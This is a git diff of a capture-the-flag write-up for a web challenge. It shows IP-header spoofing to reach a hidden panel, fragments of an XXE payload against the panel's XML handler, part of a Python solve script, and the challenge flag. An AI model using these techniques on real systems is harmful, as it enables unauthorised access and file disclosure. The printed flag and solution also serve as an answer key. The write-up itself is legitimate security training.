@@ -32,12 +32,14 @@ Players will find a basic website, without much functionality.
 
 The challenge includes source code, so let's check it. One thing that stands out immediately is a hidden control panel, only accessible when using a VPN-related header and IP.
 
+{% code overflow="wrap" %}
 ```php
 $ip_address = $_SERVER['HTTP_X_BIOCORP_VPN'] ?? $_SERVER['REMOTE_ADDR'];
 if ($ip_address === '80.187.61.102') {
     echo '<li><a href="panel.php">Control Panel</a></li>';
 }
 ```
+{% endcode %}
 
 We can use the match and replace function in burp to insert the header in all of our requests, or we could use a curl command.
 
@@ -49,6 +51,7 @@ Now we can access the panel.
 
 So, what does the panel do? It displays the XML data from the nuclear equipment. However, it also accepts data via a POST request.
 
+{% code overflow="wrap" %}
 ```php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && strpos($_SERVER['CONTENT_TYPE'], 'application/xml') !== false) {
     $xml_data = file_get_contents('php://input');
@@ -67,9 +70,11 @@ $temperature = $doc->getElementsByTagName('temperature')->item(0)->nodeValue ?? 
 $pressure = $doc->getElementsByTagName('pressure')->item(0)->nodeValue ?? 'Unknown';
 $control_rods = $doc->getElementsByTagName('control_rods')->item(0)->nodeValue ?? 'Unknown';
 ```
+{% endcode %}
 
 Classic [XXE](https://portswigger.net/web-security/xxe) vulnerability, we can send something like this to receive the flag.
 
+{% code overflow="wrap" %}
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE reactor [
@@ -83,11 +88,13 @@ Classic [XXE](https://portswigger.net/web-security/xxe) vulnerability, we can se
     </status>
 </reactor>
 ```
+{% endcode %}
 
 Alternatively, automated the whole process into a solve script.
 
 ### solve.py
 
+{% code overflow="wrap" %}
 ```python
 import requests
 
@@ -122,5 +129,6 @@ if response.status_code == 200:
 else:
     print(f"Request failed with status code {response.status_code}")
 ```
+{% endcode %}
 
 Flag: `INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}`
